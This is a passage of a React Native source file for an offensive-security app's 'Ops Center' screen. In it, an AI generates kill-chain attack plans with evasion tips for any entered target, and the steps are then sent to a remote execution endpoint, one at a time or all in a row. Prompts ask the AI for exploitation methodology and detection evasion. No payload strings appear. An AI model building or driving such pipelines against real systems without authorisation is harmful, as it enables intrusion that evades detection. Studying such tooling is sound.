    injectPrompt(`Deep dive: ${attack.title}\n${attack.cve ? `CVE: ${attack.cve}\n` : ''}Type: ${attack.type} | Severity: ${attack.severity}\n${attack.description}\n\nProvide full exploitation methodology, detection evasion, and remediation.`);
    setSelectedAttack(null);
    router.push('/(tabs)');
  }, [injectPrompt, router]);

  // ── Arsenal state ────────────────────────────────────────────────────────
  const [arsenalCat, setArsenalCat] = useState('All');
  const [arsenalSearch, setArsenalSearch] = useState('');
  const [arsenalTarget, setArsenalTarget] = useState('');
  const [selectedArsenal, setSelectedArsenal] = useState<ArsenalItem | null>(null);
  const [isExecuting, setIsExecuting] = useState(false);
  const [execOutput, setExecOutput] = useState('');
  const [execError, setExecError] = useState(false);
  const [showExecResult, setShowExecResult] = useState(false);

  const filteredArsenal = ARSENAL.filter(a => {
    if (arsenalCat !== 'All' && a.category !== arsenalCat) return false;
    if (arsenalSearch) {
      const q = arsenalSearch.toLowerCase();
      return a.name.toLowerCase().includes(q) || a.description.toLowerCase().includes(q) || (a.mitreId||'').toLowerCase().includes(q) || a.tags.some(t => t.includes(q));
    }
    return true;
  });

  const buildCmd = useCallback((template: string, tgt: string) =>
    tgt ? template.replace(/\{TARGET\}/g, tgt) : template, []);

  const handleRunArsenal = useCallback(async (item: ArsenalItem) => {
    if (isExecuting) return;
    setIsExecuting(true); setExecOutput(''); setExecError(false); setShowExecResult(true);
    const startTime = Date.now();
    const cmd = buildCmd(item.command, arsenalTarget);
    try {
      const res = await fetch(
        `${process.env.EXPO_PUBLIC_AXIOM_RUNTIME_URL || process.env.EXPO_PUBLIC_SUPABASE_URL}/api/functions/v1/code-exec`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY}` },
          body: JSON.stringify({ language: item.language || 'bash', code: cmd }),
        }
      );
      const json = await res.json();
      const out = json.output || json.error || '(no output)';
      const isErr = !json.success || !!json.error;
      const dur = Date.now() - startTime;
      setExecOutput(out); setExecError(isErr);
      await appendExecLog({ type: 'attack', target: arsenalTarget || undefined, command: cmd, language: item.language, output: out, isError: isErr, durationMs: dur, mitreId: item.mitreId, attackId: item.id, tags: [item.category.toLowerCase(), 'real-exec'] });
    } catch (err: any) {
      const msg = `Error: ${err?.message}`; setExecOutput(msg); setExecError(true);
      await appendExecLog({ type: 'attack', target: arsenalTarget || undefined, command: cmd, language: item.language, output: msg, isError: true, tags: ['arsenal', 'error'] });
    } finally { setIsExecuting(false); }
  }, [arsenalTarget, buildCmd, isExecuting]);

  // ── AI Attack Planner state ──────────────────────────────────────────────
  const [aiObjective, setAiObjective] = useState('');
  const [aiTarget, setAiTarget] = useState('');
  const [aiContext, setAiContext] = useState('');
  const [isPlanning, setIsPlanning] = useState(false);
  const [attackPlan, setAttackPlan] = useState<AttackPlan | null>(null);
  const [planError, setPlanError] = useState('');
  const [executingStepId, setExecutingStepId] = useState<number | null>(null);
  const [stepResults, setStepResults] = useState<Record<number, { output: string; isError: boolean; duration: number }>>({});
  const [expandedStep, setExpandedStep] = useState<number | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState<number | null>(null);
  const [stepAnalysis, setStepAnalysis] = useState<Record<number, any>>({});
  const [runningAll, setRunningAll] = useState(false);

  // Kill chain visualization state
  const [showKillChain, setShowKillChain] = useState(false);

  const pulseAnim = useRef(new Animated.Value(0.6)).current;
  useEffect(() => {
    if (isPlanning || runningAll) {
      Animated.loop(
        Animated.sequence([
          Animated.timing(pulseAnim, { toValue: 1, duration: 600, useNativeDriver: true }),
          Animated.timing(pulseAnim, { toValue: 0.6, duration: 600, useNativeDriver: true }),
        ])
      ).start();
    } else {
      pulseAnim.setValue(1);
    }
  }, [isPlanning, runningAll]);

  const handleGeneratePlan = useCallback(async () => {
    if (!aiObjective.trim()) return;
    setIsPlanning(true); setPlanError(''); setAttackPlan(null);
    setStepResults({}); setStepAnalysis({}); setExpandedStep(null);
    try {
      const res = await fetch(
        `${process.env.EXPO_PUBLIC_AXIOM_RUNTIME_URL || process.env.EXPO_PUBLIC_SUPABASE_URL}/api/functions/v1/axiom-attack`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY}` },
          body: JSON.stringify({ mode: 'plan', objective: aiObjective, target: aiTarget, context: aiContext }),
        }
      );
      const data = await res.json();
      if (data.error) { setPlanError(data.error); return; }
      if (!data.steps || !Array.isArray(data.steps)) {
        setPlanError('Invalid plan structure received from AI'); return;
      }
      setAttackPlan(data);
    } catch (err: any) {
      setPlanError(`Network error: ${err?.message}`);
    } finally { setIsPlanning(false); }
  }, [aiObjective, aiTarget, aiContext]);

  const executeStep = useCallback(async (step: AttackStep, targetOverride?: string): Promise<boolean> => {
    const tgt = targetOverride || aiTarget;
    const code = tgt ? step.code.replace(/\{TARGET\}/g, tgt) : step.code;
    const t0 = Date.now();
    try {
      const res = await fetch(
        `${process.env.EXPO_PUBLIC_AXIOM_RUNTIME_URL || process.env.EXPO_PUBLIC_SUPABASE_URL}/api/functions/v1/code-exec`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY}` },
          body: JSON.stringify({ language: step.language || 'bash', code }),
        }
      );
      const json = await res.json();
      const out = json.output || json.error || '(no output)';
      const isErr = !json.success || !!json.error;
      const dur = Date.now() - t0;
      setStepResults(prev => ({ ...prev, [step.id]: { output: out, isError: isErr, duration: dur } }));
      await appendExecLog({ type: 'attack', target: tgt || undefined, command: code, language: step.language, output: out, isError: isErr, durationMs: dur, mitreId: step.mitre_id, tags: ['ai-guided', step.phase.toLowerCase().replace(/ /g, '-')] });
      return !isErr;
    } catch (err: any) {
      const msg = `Error: ${err?.message}`;
      setStepResults(prev => ({ ...prev, [step.id]: { output: msg, isError: true, duration: Date.now() - t0 } }));
      return false;
    }
  }, [aiTarget]);

  const handleRunStep = useCallback(async (step: AttackStep) => {
    if (executingStepId !== null) return;
    setExecutingStepId(step.id);
    await executeStep(step);
    setExecutingStepId(null);
    setExpandedStep(step.id);
  }, [executingStepId, executeStep]);

  const handleRunAllSteps = useCallback(async () => {
    if (!attackPlan || runningAll) return;
    setRunningAll(true);
    for (const step of attackPlan.steps) {
      setExecutingStepId(step.id);
      const success = await executeStep(step);
      setExecutingStepId(null);
      // Short pause between steps
      await new Promise(r => setTimeout(r, 500));
      // Stop on critical failure
      if (!success && step.risk === 'critical') break;
    }
    setRunningAll(false);
  }, [attackPlan, runningAll, executeStep]);

  const handleAnalyzeOutput = useCallback(async (step: AttackStep) => {
    const result = stepResults[step.id];
    if (!result || isAnalyzing !== null) return;
    setIsAnalyzing(step.id);
    try {
      const res = await fetch(
        `${process.env.EXPO_PUBLIC_AXIOM_RUNTIME_URL || process.env.EXPO_PUBLIC_SUPABASE_URL}/api/functions/v1/axiom-attack`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY}` },
          body: JSON.stringify({ mode: 'analyze', objective: step.code, target: result.output, context: `Step: ${step.name}, MITRE: ${step.mitre_id}` }),
        }
      );
      const data = await res.json();
      setStepAnalysis(prev => ({ ...prev, [step.id]: data }));
    } catch (err: any) {
      setStepAnalysis(prev => ({ ...prev, [step.id]: { error: err?.message } }));
    } finally { setIsAnalyzing(null); }
  }, [stepResults, isAnalyzing]);

  const handleDeepDiveStep = useCallback((step: AttackStep) => {
    injectPrompt(`Provide detailed guidance for this attack step:\nStep: ${step.name}\nPhase: ${step.phase}\nMITRE: ${step.mitre_id || 'N/A'}\nCode:\n\`\`\`${step.language}\n${step.code}\n\`\`\`\nExpected: ${step.expected_output || 'N/A'}\nDetection risk: ${step.detection_risk || 'N/A'}\n\nProvide evasion techniques, alternative approaches, and what to do with the output.`);
    router.push('/(tabs)');
  }, [injectPrompt, router]);

  // ── Log state ────────────────────────────────────────────────────────────
  const [logEntries, setLogEntries] = useState<ExecLogEntry[]>([]);
  const [logSearch, setLogSearch] = useState('');
  const [logFilter, setLogFilter] = useState<LogEntryType | 'all'>('all');
  const [selectedLog, setSelectedLog] = useState<ExecLogEntry | null>(null);
  const [isExporting, setIsExporting] = useState(false);
  const [showClearConfirm, setShowClearConfirm] = useState(false);

  useEffect(() => {
    if (activeTab === 'log') loadExecLog().then(setLogEntries);
  }, [activeTab]);

  useEffect(() => {
    const interval = setInterval(() => loadExecLog().then(setLogEntries), 4000);
    return () => clearInterval(interval);
  }, []);

  const filteredLog = logEntries.filter(e => {
    if (logFilter !== 'all' && e.type !== logFilter) return false;
    if (logSearch) { const q = logSearch.toLowerCase(); return e.command.toLowerCase().includes(q) || e.output.toLowerCase().includes(q) || (e.target||'').toLowerCase().includes(q); }
    return true;
  });

  const logStats = getLogStats(logEntries);

  const handleClearLog = useCallback(async () => { await clearExecLog(); setLogEntries([]); setShowClearConfirm(false); }, []);
  const handleExportLog = useCallback(async () => { setIsExporting(true); try { const c = await exportExecLog(); await Share.share({ message: c, title: 'AXIOM Ops Log' }); } catch {} setIsExporting(false); }, []);
  const formatTime = (d: Date) => { const diff = Date.now()-new Date(d).getTime(); if (diff<60000) return 'just now'; if (diff<3600000) return `${Math.floor(diff/60000)}m`; if (diff<86400000) return `${Math.floor(diff/3600000)}h`; return new Date(d).toLocaleDateString(); };

  // ── Tab bar ──────────────────────────────────────────────────────────────
  const TABS: { id: OpsTab; label: string; icon: string; color: string }[] = [
    { id: 'attacks', label: 'ATTACKS', icon: 'bug-report', color: Colors.danger  },
    { id: 'arsenal', label: 'ARSENAL', icon: 'flash-on',   color: Colors.warning },
    { id: 'ai',      label: 'AI PLAN', icon: 'psychology', color: Colors.primary },
    { id: 'log',     label: 'LOG',     icon: 'history',    color: Colors.info    },
  ];

  const attackStats = { total: attacks.length, critical: attacks.filter(a=>a.severity==='critical').length, zeroDays: attacks.filter(a=>a.type==='zero-day').length, exploited: attacks.filter(a=>a.status==='exploited').length };
  const doneSteps = Object.keys(stepResults).length;
  const totalSteps = attackPlan?.steps.length || 0;

  return (
    <SafeAreaView style={styles.safe} edges={['top']}>
      {/* Header */}
      <View style={styles.header}>
        <Text style={styles.headerTitle}>OPS CENTER</Text>
        <View style={styles.headerRight}>
          {activeTab === 'attacks' && (
            <Pressable style={({ pressed }) => [styles.addBtn, pressed && { opacity: 0.8 }]} onPress={() => { setEditDraft(createAttack()); setShowAttackForm(true); }}>
              <MaterialIcons name="add" size={16} color={Colors.bg} />
              <Text style={styles.addBtnText}>LOG</Text>
            </Pressable>
          )}
          {activeTab === 'log' && (
            <View style={styles.logActions}>
              <Pressable style={({ pressed }) => [styles.iconBtn, pressed && { opacity: 0.7 }]} onPress={handleExportLog} disabled={isExporting}>
                {isExporting ? <ActivityIndicator size="small" color={Colors.accent} /> : <MaterialIcons name="upload" size={15} color={Colors.accent} />}
              </Pressable>
              <Pressable style={({ pressed }) => [styles.iconBtn, { borderColor: Colors.danger+'44' }, pressed && { opacity: 0.7 }]} onPress={() => setShowClearConfirm(true)}>
                <MaterialIcons name="delete-sweep" size={15} color={Colors.danger} />
              </Pressable>
            </View>
          )}
          {activeTab === 'ai' && attackPlan && (
            <Pressable style={({ pressed }) => [styles.addBtn, { backgroundColor: '#444' }, pressed && { opacity: 0.8 }]} onPress={() => { setAttackPlan(null); setStepResults({}); setStepAnalysis({}); }}>
              <MaterialIcons name="refresh" size={14} color={Colors.textPrimary} />
              <Text style={[styles.addBtnText, { color: Colors.textPrimary }]}>RESET</Text>
            </Pressable>
          )}
        </View>
      </View>

      {/* Sub-tabs */}
      <View style={styles.subTabBar}>
        {TABS.map(tab => (
          <Pressable key={tab.id} style={[styles.subTab, activeTab === tab.id && { borderBottomColor: tab.color, borderBottomWidth: 2 }]} onPress={() => setActiveTab(tab.id)}>
            <MaterialIcons name={tab.icon as any} size={14} color={activeTab === tab.id ? tab.color : Colors.textMuted} />
            <Text style={[styles.subTabText, activeTab === tab.id && { color: tab.color }]}>{tab.label}</Text>
          </Pressable>
        ))}
      </View>

      {/* ══ ATTACKS ══ */}
      {activeTab === 'attacks' && (
        <View style={styles.flex}>
          <View style={styles.statsBar}>
            {[['Total', attackStats.total, Colors.textSecondary], ['Critical', attackStats.critical, Colors.danger], ['Zero-Days', attackStats.zeroDays, Colors.danger], ['Exploited', attackStats.exploited, Colors.warning]].map(([l,v,c]) => (
              <View key={l as string} style={styles.stat}>
                <Text style={[styles.statValue, { color: c as string }]}>{v as number}</Text>
                <Text style={styles.statLabel}>{l as string}</Text>
              </View>
            ))}
          </View>
          <View style={styles.searchBar}>
            <MaterialIcons name="search" size={15} color={Colors.textMuted} />
            <TextInput style={styles.searchInput} value={attackSearch} onChangeText={setAttackSearch} placeholder="Search CVE, title, technique..." placeholderTextColor={Colors.textMuted} />
            {attackSearch ? <Pressable onPress={() => setAttackSearch('')} hitSlop={8}><MaterialIcons name="close" size={13} color={Colors.textMuted} /></Pressable> : null}
          </View>
          <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
            <Pressable style={[styles.chip, attackSevFilter==='all' && styles.chipActive]} onPress={() => setAttackSevFilter('all')}><Text style={[styles.chipText, attackSevFilter==='all' && { color: Colors.primary }]}>All</Text></Pressable>
            {ATTACK_SEVERITIES.map(s => (
              <Pressable key={s} style={[styles.chip, attackSevFilter===s && { borderColor: SEV_CFG[s].color+'55', backgroundColor: SEV_CFG[s].color+'11' }]} onPress={() => setAttackSevFilter(attackSevFilter===s?'all':s)}>
                <View style={[styles.chipDot, { backgroundColor: SEV_CFG[s].color }]} />
                <Text style={[styles.chipText, attackSevFilter===s && { color: SEV_CFG[s].color }]}>{SEV_CFG[s].label}</Text>
              </Pressable>
            ))}
          </ScrollView>
          {attacks.length === 0 ? (
            <View style={styles.empty}><MaterialIcons name="bug-report" size={48} color={Colors.textMuted} /><Text style={styles.emptyTitle}>No attacks logged</Text><Text style={styles.emptySub}>Tap LOG to register vulnerabilities, CVEs, and zero-days</Text></View>
          ) : (
            <FlatList
              data={filteredAttacks}
              keyExtractor={a => a.id}
              contentContainerStyle={[styles.list, { paddingBottom: insets.bottom + 110 }]}
              showsVerticalScrollIndicator={false}
              ListEmptyComponent={() => <View style={styles.empty}><Text style={styles.emptyTitle}>No matches</Text></View>}
              renderItem={({ item }) => {
                const sev = SEV_CFG[item.severity]; const typ = TYPE_CFG[item.type]; const sta = STATUS_CFG[item.status];
                return (
                  <Pressable style={({ pressed }) => [styles.attackCard, pressed && { opacity: 0.75 }]} onPress={() => setSelectedAttack(item)}>
                    <View style={[styles.sevStripe, { backgroundColor: sev.color }]} />
                    <View style={styles.cardBody}>
                      <View style={styles.cardTopRow}>
                        <View style={[styles.miniTag, { borderColor: typ.color+'55', backgroundColor: typ.color+'11' }]}><MaterialIcons name={typ.icon as any} size={9} color={typ.color} /><Text style={[styles.miniTagText, { color: typ.color }]}>{typ.label}</Text></View>
                        <View style={[styles.miniTag, { borderColor: sev.color+'55', backgroundColor: sev.color+'11' }]}><Text style={[styles.miniTagText, { color: sev.color }]}>{sev.label}</Text></View>
                        {item.cvssScore !== undefined ? <View style={styles.miniTag}><Text style={styles.miniTagText}>CVSS {item.cvssScore.toFixed(1)}</Text></View> : null}
                        <View style={[styles.statusDot, { backgroundColor: sta.color }]} />
                      </View>
                      <Text style={styles.cardTitle} numberOfLines={1}>{item.title || 'Untitled'}</Text>
                      {item.cve ? <Text style={[styles.cardSub, { color: Colors.warning }]}>{item.cve}</Text> : null}
                      <Text style={styles.cardDesc} numberOfLines={2}>{item.description}</Text>
                      <View style={styles.cardMetaRow}>
                        {item.mitreId ? <View style={[styles.miniTag, { borderColor: Colors.accent+'33', backgroundColor: Colors.accentMuted }]}><Text style={[styles.miniTagText, { color: Colors.accent }]}>{item.mitreId}</Text></View> : null}
                        <Text style={styles.cardTime}>{new Date(item.discoveredAt).toLocaleDateString()}</Text>
                      </View>
                    </View>
                  </Pressable>
                );
              }}
            />
          )}
        </View>
      )}

      {/* ══ ARSENAL ══ */}
      {activeTab === 'arsenal' && (
        <View style={styles.flex}>
          <View style={[styles.targetBar, arsenalTarget && { borderColor: Colors.warning+'44' }]}>
            <MaterialIcons name="gps-fixed" size={14} color={Colors.warning} />
            <TextInput style={styles.targetInput} value={arsenalTarget} onChangeText={setArsenalTarget} placeholder="Target IP / domain (applied globally)" placeholderTextColor={Colors.textMuted} autoCapitalize="none" autoCorrect={false} />
            {arsenalTarget ? <Pressable onPress={() => setArsenalTarget('')} hitSlop={8}><MaterialIcons name="close" size={13} color={Colors.textMuted} /></Pressable> : null}
          </View>
          <View style={styles.searchBar}>
            <MaterialIcons name="search" size={15} color={Colors.textMuted} />
            <TextInput style={styles.searchInput} value={arsenalSearch} onChangeText={setArsenalSearch} placeholder={`Search ${ARSENAL.length} tools, MITRE IDs...`} placeholderTextColor={Colors.textMuted} autoCapitalize="none" />
            {arsenalSearch ? <Pressable onPress={() => setArsenalSearch('')} hitSlop={8}><MaterialIcons name="close" size={13} color={Colors.textMuted} /></Pressable> : null}
          </View>
          <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={styles.chipRow}>
            {ARSENAL_CATS.map(cat => (
              <Pressable key={cat} style={[styles.chip, arsenalCat===cat && styles.chipActive]} onPress={() => setArsenalCat(cat)}>
                <Text style={[styles.chipText, arsenalCat===cat && { color: Colors.primary }]}>
                  {cat === 'All' ? `All (${ARSENAL.length})` : `${cat} (${ARSENAL.filter(a=>a.category===cat).length})`}
                </Text>
              </Pressable>
            ))}
          </ScrollView>
          <FlatList
            data={filteredArsenal}
            keyExtractor={a => a.id}
            contentContainerStyle={[styles.list, { paddingBottom: insets.bottom + 110 }]}
            showsVerticalScrollIndicator={false}
            ListEmptyComponent={() => <View style={styles.empty}><Text style={styles.emptyTitle}>No tools found</Text></View>}
            renderItem={({ item }) => {
              const sev = SEV_CFG[item.severity as AttackSeverity] || { color: Colors.textMuted, label: item.severity };
              return (
                <Pressable style={({ pressed }) => [styles.arsenalCard, pressed && { opacity: 0.75 }]} onPress={() => setSelectedArsenal(item)}>
                  <View style={[styles.arsenalIcon, { backgroundColor: item.color+'15', borderColor: item.color+'33' }]}>
                    <MaterialIcons name={item.icon as any} size={20} color={item.color} />
                  </View>
                  <View style={styles.cardBody}>
                    <View style={styles.cardTopRow}>
                      <Text style={styles.cardTitle} numberOfLines={1}>{item.name}</Text>
                      <View style={[styles.miniTag, { borderColor: sev.color+'55', backgroundColor: sev.color+'11' }]}><Text style={[styles.miniTagText, { color: sev.color }]}>{sev.label}</Text></View>
                    </View>
                    <Text style={styles.cardDesc} numberOfLines={2}>{item.description}</Text>
                    <View style={styles.cardMetaRow}>
                      {item.mitreId ? <View style={[styles.miniTag, { borderColor: Colors.accent+'33', backgroundColor: Colors.accentMuted }]}><Text style={[styles.miniTagText, { color: Colors.accent }]}>{item.mitreId}</Text></View> : null}
                      <View style={styles.miniTag}><Text style={styles.miniTagText}>{item.category}</Text></View>
                    </View>
                  </View>
                  <MaterialIcons name="chevron-right" size={18} color={Colors.textMuted} />
                </Pressable>
              );
            }}
          />
        </View>
      )}

      {/* ══ AI ATTACK PLANNER ══ */}
      {activeTab === 'ai' && (
        <ScrollView style={styles.flex} showsVerticalScrollIndicator={false} contentContainerStyle={[styles.aiContent, { paddingBottom: insets.bottom + 110 }]}>
          {/* Input form — only show when no plan */}
          {!attackPlan ? (
            <View style={styles.aiForm}>
              <View style={styles.aiFormHeader}>
                <Animated.View style={{ opacity: pulseAnim }}>
                  <MaterialIcons name="psychology" size={24} color={Colors.primary} />
                </Animated.View>
                <View style={{ flex: 1 }}>
                  <Text style={styles.aiFormTitle}>AI-GUIDED ATTACK PLANNER</Text>
                  <Text style={styles.aiFormSub}>AI generates a full kill chain → each step executes in real Linux sandbox</Text>
                </View>
              </View>

              <Text style={styles.fieldLabel}>ATTACK OBJECTIVE *</Text>
              <TextInput
                style={[styles.aiInput, { minHeight: 60, textAlignVertical: 'top' }]}
                value={aiObjective}
                onChangeText={setAiObjective}
                placeholder="e.g. Compromise a web application, escalate to root, establish persistence"
                placeholderTextColor={Colors.textMuted}
                multiline
                autoCapitalize="none"
                autoCorrect={false}
              />

              <Text style={[styles.fieldLabel, { marginTop: Spacing.md }]}>TARGET *</Text>
              <View style={[styles.targetBar, { marginHorizontal: 0, marginTop: 0 }]}>
                <MaterialIcons name="gps-fixed" size={14} color={Colors.warning} />
                <TextInput style={styles.targetInput} value={aiTarget} onChangeText={setAiTarget} placeholder="IP address or domain" placeholderTextColor={Colors.textMuted} autoCapitalize="none" autoCorrect={false} />
              </View>

              <Text style={[styles.fieldLabel, { marginTop: Spacing.md }]}>CONTEXT / SCOPE</Text>
              <TextInput
                style={styles.aiInput}
                value={aiContext}
                onChangeText={setAiContext}
                placeholder="e.g. Linux server, authorized pentest, no IDS, full network access"
                placeholderTextColor={Colors.textMuted}
                autoCapitalize="none"
                autoCorrect={false}
              />

              {planError ? (
                <View style={styles.errorBox}>
                  <MaterialIcons name="error-outline" size={14} color={Colors.danger} />
                  <Text style={styles.errorText}>{planError}</Text>
                </View>
              ) : null}

              <Pressable
                style={({ pressed }) => [styles.planBtn, isPlanning && styles.btnDisabled, pressed && { opacity: 0.8 }]}
                onPress={handleGeneratePlan}
                disabled={isPlanning || !aiObjective.trim()}
              >
                {isPlanning ? (
                  <><ActivityIndicator size="small" color={Colors.bg} /><Text style={styles.planBtnText}>AI IS PLANNING...</Text></>
                ) : (
                  <><MaterialIcons name="psychology" size={16} color={Colors.bg} /><Text style={styles.planBtnText}>GENERATE ATTACK PLAN</Text></>
                )}
              </Pressable>

              {isPlanning ? (
                <View style={styles.planningIndicator}>
                  <ActivityIndicator size="small" color={Colors.primary} />
                  <Text style={styles.planningText}>Analyzing attack surface · Mapping MITRE TTPs · Building kill chain...</Text>
                </View>
              ) : null}
            </View>
          ) : (
            /* ── Plan View ── */
            <View>
              {/* Plan header */}
              <View style={styles.planHeader}>
                <View style={styles.planTitleRow}>
                  <MaterialIcons name="psychology" size={16} color={Colors.primary} />
                  <Text style={styles.planTitle} numberOfLines={2}>{attackPlan.title}</Text>
                </View>
                <View style={styles.planMetaRow}>
                  {attackPlan.opsec_level ? (
                    <View style={[styles.opsecBadge, { borderColor: (OPSEC_COLORS[attackPlan.opsec_level]||Colors.textMuted)+'55', backgroundColor: (OPSEC_COLORS[attackPlan.opsec_level]||Colors.textMuted)+'11' }]}>
                      <Text style={[styles.opsecText, { color: OPSEC_COLORS[attackPlan.opsec_level]||Colors.textMuted }]}>
                        {attackPlan.opsec_level.toUpperCase()} OPSEC
                      </Text>
                    </View>
                  ) : null}
                  {attackPlan.estimated_time ? (
                    <View style={styles.miniTag}><MaterialIcons name="timer" size={9} color={Colors.textMuted} /><Text style={styles.miniTagText}>{attackPlan.estimated_time}</Text></View>
                  ) : null}
                  <View style={[styles.miniTag, { borderColor: Colors.primary+'44', backgroundColor: Colors.primaryMuted }]}>
                    <Text style={[styles.miniTagText, { color: Colors.primary }]}>{totalSteps} STEPS</Text>
                  </View>
                  {doneSteps > 0 ? (
                    <View style={[styles.miniTag, { borderColor: Colors.accent+'44', backgroundColor: Colors.accentMuted }]}>
                      <Text style={[styles.miniTagText, { color: Colors.accent }]}>{doneSteps}/{totalSteps} DONE</Text>
                    </View>
                  ) : null}
                  {/* Kill chain button */}
                  <Pressable
                    style={({ pressed }) => [styles.miniTag, { borderColor: Colors.accent+'44', backgroundColor: Colors.accentMuted }, pressed && { opacity: 0.7 }]}
                    onPress={() => setShowKillChain(true)}
                  >
                    <MaterialIcons name="account-tree" size={9} color={Colors.accent} />
                    <Text style={[styles.miniTagText, { color: Colors.accent }]}>CHAIN</Text>
                  </Pressable>
                </View>
                {attackPlan.notes ? <Text style={styles.planNotes}>{attackPlan.notes}</Text> : null}
                {attackPlan.prerequisites && attackPlan.prerequisites.length > 0 ? (
                  <View style={styles.prereqRow}>
                    <Text style={styles.prereqLabel}>PREREQS:</Text>
                    {attackPlan.prerequisites.map(p => <View key={p} style={styles.miniTag}><Text style={styles.miniTagText}>{p}</Text></View>)}
                  </View>
                ) : null}
              </View>

              {/* Progress bar */}
              {totalSteps > 0 ? (
                <View style={styles.progressBar}>
                  <View style={[styles.progressFill, { width: `${(doneSteps/totalSteps)*100}%` as any }]} />
                </View>
              ) : null}

              {/* Run all button */}
              <Pressable
                style={({ pressed }) => [styles.runAllBtn, runningAll && styles.btnDisabled, pressed && { opacity: 0.8 }]}
                onPress={handleRunAllSteps}
                disabled={runningAll || executingStepId !== null}
              >
                {runningAll ? (
                  <><Animated.View style={{ opacity: pulseAnim }}><MaterialIcons name="play-arrow" size={16} color={Colors.bg} /></Animated.View><Text style={styles.runAllBtnText}>EXECUTING ALL STEPS...</Text></>
                ) : (
                  <><MaterialIcons name="play-arrow" size={16} color={Colors.bg} /><Text style={styles.runAllBtnText}>EXECUTE ALL STEPS (REAL LINUX)</Text></>
                )}
              </Pressable>

              {/* Steps */}
              {attackPlan.steps.map((step, idx) => {
                const result = stepResults[step.id];
                const analysis = stepAnalysis[step.id];
                const isRunning = executingStepId === step.id;
                const isDone = !!result;
                const isExpanded = expandedStep === step.id;
                const phaseColor = PHASE_COLORS[step.phase] || Colors.textMuted;
                const riskColor = RISK_COLORS[step.risk] || Colors.textMuted;

                return (
                  <View key={step.id} style={[styles.stepCard, isDone && { borderColor: result.isError ? Colors.danger+'44' : Colors.accent+'33' }]}>
                    {/* Step header */}
                    <Pressable style={styles.stepHeader} onPress={() => setExpandedStep(isExpanded ? null : step.id)}>
                      <View style={[styles.stepNum, { backgroundColor: isRunning ? Colors.warning+'22' : isDone ? (result.isError ? Colors.danger+'22' : Colors.accent+'22') : Colors.surfaceElevated, borderColor: isRunning ? Colors.warning : isDone ? (result.isError ? Colors.danger : Colors.accent) : Colors.surfaceBorder }]}>
                        {isRunning ? <ActivityIndicator size="small" color={Colors.warning} /> : isDone ? <MaterialIcons name={result.isError ? 'error' : 'check'} size={14} color={result.isError ? Colors.danger : Colors.accent} /> : <Text style={styles.stepNumText}>{idx+1}</Text>}
                      </View>
                      <View style={{ flex: 1 }}>
                        <View style={styles.stepTitleRow}>
                          <Text style={styles.stepName} numberOfLines={1}>{step.name}</Text>
                          <View style={[styles.miniTag, { borderColor: phaseColor+'44', backgroundColor: phaseColor+'0d' }]}>
                            <Text style={[styles.miniTagText, { color: phaseColor }]}>{step.phase}</Text>
                          </View>
                          <View style={[styles.miniTag, { borderColor: riskColor+'44', backgroundColor: riskColor+'0d' }]}>
                            <Text style={[styles.miniTagText, { color: riskColor }]}>{step.risk.toUpperCase()}</Text>
                          </View>
                        </View>
                        <Text style={styles.stepDesc} numberOfLines={1}>{step.description}</Text>
                        {step.mitre_id ? <Text style={[styles.stepMitre, { color: Colors.accent }]}>{step.mitre_id}</Text> : null}
                      </View>
                      <MaterialIcons name={isExpanded ? 'keyboard-arrow-up' : 'keyboard-arrow-down'} size={18} color={Colors.textMuted} />
                    </Pressable>

                    {/* Expanded content */}
                    {isExpanded ? (
                      <View style={styles.stepExpanded}>
                        {/* Code */}
                        <Text style={styles.codeLabel}>CODE ({step.language.toUpperCase()})</Text>
                        <View style={styles.codeBlock}>
                          <Text style={[styles.codeText, { color: Colors.accent }]} selectable>
                            {buildCmd(step.code, aiTarget)}
                          </Text>
                        </View>

                        {/* Expected output */}
                        {step.expected_output ? (
                          <View style={styles.stepInfoRow}>
                            <MaterialIcons name="check-circle-outline" size={11} color={Colors.textMuted} />
                            <Text style={styles.stepInfoText}>Expected: {step.expected_output}</Text>
                          </View>
                        ) : null}

                        {step.evasion_tips ? (
                          <View style={styles.stepInfoRow}>
                            <MaterialIcons name="visibility-off" size={11} color={Colors.accent} />
                            <Text style={[styles.stepInfoText, { color: Colors.accent }]}>Evasion: {step.evasion_tips}</Text>
                          </View>
                        ) : null}

                        {step.detection_risk ? (
                          <View style={styles.stepInfoRow}>
                            <MaterialIcons name="warning" size={11} color={Colors.warning} />
                            <Text style={[styles.stepInfoText, { color: Colors.warning }]}>Detection: {step.detection_risk}</Text>
                          </View>
                        ) : null}

                        {/* Step actions */}
                        <View style={styles.stepActions}>
                          <Pressable
                            style={({ pressed }) => [styles.stepRunBtn, isRunning && styles.btnDisabled, pressed && { opacity: 0.8 }]}
                            onPress={() => handleRunStep(step)}
                            disabled={isRunning || executingStepId !== null}
                          >
                            {isRunning ? <ActivityIndicator size="small" color={Colors.bg} /> : <MaterialIcons name="play-arrow" size={14} color={Colors.bg} />}
                            <Text style={styles.stepRunBtnText}>{isRunning ? 'RUNNING...' : 'EXECUTE STEP'}</Text>
                          </Pressable>
                          <Pressable
                            style={({ pressed }) => [styles.stepSecBtn, pressed && { opacity: 0.7 }]}
                            onPress={() => handleDeepDiveStep(step)}
                          >
                            <MaterialIcons name="chat" size={13} color={Colors.primary} />
                            <Text style={[styles.stepSecBtnText, { color: Colors.primary }]}>AI GUIDE</Text>
                          </Pressable>
                        </View>

                        {/* Execution result */}
                        {result ? (
                          <View style={[styles.resultBox, { borderColor: result.isError ? Colors.danger+'33' : Colors.accent+'22' }]}>
                            <View style={styles.resultHeader}>
                              <View style={[styles.resultDot, { backgroundColor: result.isError ? Colors.danger : Colors.accent }]} />
                              <Text style={[styles.resultStatus, { color: result.isError ? Colors.danger : Colors.accent }]}>
                                {result.isError ? 'ERROR' : 'SUCCESS'} · {result.duration}ms
                              </Text>
                              <Pressable
